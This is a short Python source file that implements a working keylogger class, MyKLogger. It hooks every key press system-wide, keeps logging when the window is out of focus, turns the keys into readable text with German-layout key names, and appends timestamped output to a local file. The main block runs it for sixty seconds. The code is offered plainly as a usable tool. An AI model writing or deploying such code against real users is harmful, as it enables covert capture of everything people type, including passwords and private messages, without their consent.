import keyboard
from keyboard import KeyboardEvent
from time import sleep, time
from datetime import datetime as dt

class MyKLogger:
    def __init__(self) -> None:
        self._keys: list[str] = []
        self._special_mappings = {
            "space": " ",
            "enter": "\n",
            "tab": "\t",
            "strg": "<strg>",
            "strg-rechts": "<strg>",
            "alt": "<alt>",
            "alt gr": "<alt>",
            "entf": "<del>",
            "nach-links": "<l>",
            "nach-rechts": "<r>",
            "nach-oben": "<u>",
            "nach-unten": "<d>",
            "esc": "<esc>",
            "linke windows": "<win>",
            "rechte windows": "<win>"
        }

    def _log_key(self, key_event: KeyboardEvent):
        self._keys.append(key_event.name)
        # print(key_event.name)

        if len(self._keys) >= 32 and key_event.name == "enter":
                self._dump_to_file()

    def _dump_to_file(self):
        line = ""
        last = ""
        for key in self._keys:
            if key in self._special_mappings.keys():
                last = self._special_mappings[key]
            elif key == "backspace":
                line = line[:-len(last)]
                last = ""
                continue
            elif len(key) > 1:
                if len(key) == 2 and key[0] == "f":
                    last = "<"+key+">"
                else:
                    last = ""
            else:
                last = key
            line += last
        
        with open("./key.log", "a", encoding="UTF-8") as klog_file:
            klog_file.write(f"{dt.fromtimestamp(int(time()))}:\n{line}\n")
        self._keys = []

    def run_logger(self, duration: int):
        """Runs a key logger.
        
        This function is blocking program execution for <duration> seconds!\n
        Continues logging keys even when out of focus!
        
        Args:
            duration (int): How long the logger will run.
        """
        self.start_logger()
        sleep(duration)
        self.stop_logger()
    
    def start_logger(self):
        """Starts a key logger in the background.
        """
        keyboard.on_press(self._log_key)
    
    def stop_logger(self):
        """Stops active logger.
        """
        keyboard.unhook_all()
        self._dump_to_file()
    
    def __del__(self):
        self.stop_logger()


if __name__ == "__main__":
    klog = MyKLogger()
    klog.run_logger(60)
